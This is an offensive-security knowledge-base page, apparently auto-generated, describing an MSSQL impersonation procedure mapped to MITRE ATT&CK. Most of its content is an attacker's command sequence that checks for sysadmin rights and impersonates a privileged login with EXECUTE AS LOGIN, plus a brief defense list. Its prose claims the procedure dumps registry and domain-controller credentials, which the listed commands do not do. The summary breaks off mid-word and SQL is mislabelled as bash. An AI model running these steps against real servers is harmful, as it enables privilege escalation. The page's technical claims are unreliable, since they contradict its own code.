---
id: 175a4922-2470-4c4c-91df-1caf4ee8f1f8
name: Impersonation Credential Check
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:21.044509+00:00'
updated_at: '2023-04-10T20:36:37.172560+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Discovery|TA0007 - Discovery]]'
techniques:
- '[[Credential Dumping|T1003 - Credential Dumping]]'
- '[[Query Registry|T1012 - Query Registry]]'
tags:
- '[[Exploiting Impersonation]]'
- '[[Manual SQL Server Queries]]'
- '[[MSSQL Server]]'
commands:
- '[[Execute as Login]]'
- '[[Select Is SRVROLEMEMBER]]'
- '[[Select Is SRVROLEMEMBER]]'
- '[[Select Original Login]]'
- '[[Select System User]]'
- '[[Select System User]]'
---

# Impersonation Credential Check

## Summary

The Impersonation Credential Check procedure is used to obtain system user and login credentials by exploiting impersonation in MSSQL Server. This is achieved by manually querying the registry and domain controller using SQL Server queries. This procedure can be used by an attacker to gain access t

## Description

# Description

The Impersonation Credential Check procedure is used to obtain system user and login credentials by exploiting impersonation in MSSQL Server. This is achieved by manually querying the registry and domain controller using SQL Server queries. This procedure can be used by an attacker to gain access to sensitive information and escalate privileges. 

From a technical standpoint, the attacker would use a SQL Server query to impersonate a user with elevated privileges and then query the registry for stored credentials. The attacker can also query the domain controller for additional credentials. 

The business value of this procedure is that it allows attackers to gain access to sensitive information and escalate privileges, potentially leading to a complete compromise of the targeted system.

## Requirements

1. Valid login credentials for the MSSQL Server

## Defense

1. Implement the principle of least privilege to limit the potential impact of an attacker who has gained access to elevated privileges

1. Implement strong authentication mechanisms and monitor for any suspicious activity on the network

1. Regularly review and update access control policies to ensure that only authorized users have access to sensitive information

## Objectives

1. Obtain system user and login credentials

1. Escalate privileges

# Instructions

1. This command is used to check the system user and login credentials. The command will return the current system user and whether the user is a member of the sysadmin server role. The command will then execute a login as the specified user 'adminuser' and return the system user and whether the user is a member of the sysadmin server role. Finally, the command will return the original login credentials.

**Code**: [[SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadm]]

> The first SELECT statement returns the current system user. The second SELECT statement returns whether the user is a member of the sysadmin server role. The EXECUTE AS statement executes subsequent commands as the specified user 'adminuser'. The third SELECT statement returns the system user after executing the login as 'adminuser'. The fourth SELECT statement returns whether the user is a member of the sysadmin server role after executing the login as 'adminuser'. The fifth SELECT statement returns the original login credentials.

**Command** ([[Select System User]]):

```bash
SELECT SYSTEM_USER
```

**Command** ([[Select Is SRVROLEMEMBER]]):

```bash
SELECT IS_SRVROLEMEMBER('sysadmin')
```

**Command** ([[Execute as Login]]):

```bash
EXECUTE AS LOGIN = 'adminuser'
```

**Command** ([[Select System User]]):

```bash
SELECT SYSTEM_USER
```

**Command** ([[Select Is SRVROLEMEMBER]]):

```bash
SELECT IS_SRVROLEMEMBER('sysadmin')
```

**Command** ([[Select Original Login]]):

```bash
SELECT ORIGINAL_LOGIN()
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Discovery|TA0007 - Discovery]]

### Techniques

- [[Credential Dumping|T1003 - Credential Dumping]]
- [[Query Registry|T1012 - Query Registry]]

## Commands Used

- [[Execute as Login]]
- [[Select Is SRVROLEMEMBER]]
- [[Select Is SRVROLEMEMBER]]
- [[Select Original Login]]
- [[Select System User]]
- [[Select System User]]

## Tags

- [[Exploiting Impersonation]]
- [[Manual SQL Server Queries]]
- [[MSSQL Server]]
